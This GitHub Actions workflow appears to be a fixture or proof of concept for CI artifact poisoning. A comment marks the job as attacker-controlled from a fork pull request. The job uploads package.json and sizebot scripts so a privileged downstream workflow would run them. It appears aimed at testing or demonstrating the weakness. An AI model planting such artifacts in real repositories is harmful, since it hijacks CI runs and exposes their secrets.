name: (Runtime) Build and Test
on:
  pull_request:
  push:
    branches: [main]
permissions: {}
jobs:
  sizebot:
    if: ${{ github.event_name == 'pull_request' && github.event.pull_request.base.ref == 'main' }}
    runs-on: ubuntu-latest
    permissions:
      actions: read
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - name: Write results
        run: echo '{"version":1,"status":"ok","baseSha":"aaaaaaa","headSha":"bbbbbbb","artifacts":[]}' > sizebot-results.json
      # Attacker controls this job (fork PR). Multiple paths force upload-artifact
      # to use the workspace root as the artifact root, preserving scripts/... paths.
      - uses: actions/upload-artifact@v4
        with:
          name: sizebot-results
          path: |
            package.json
            sizebot-results.json
            scripts/sizebot/render-comment.js
            scripts/sizebot/pull-request-comment.js
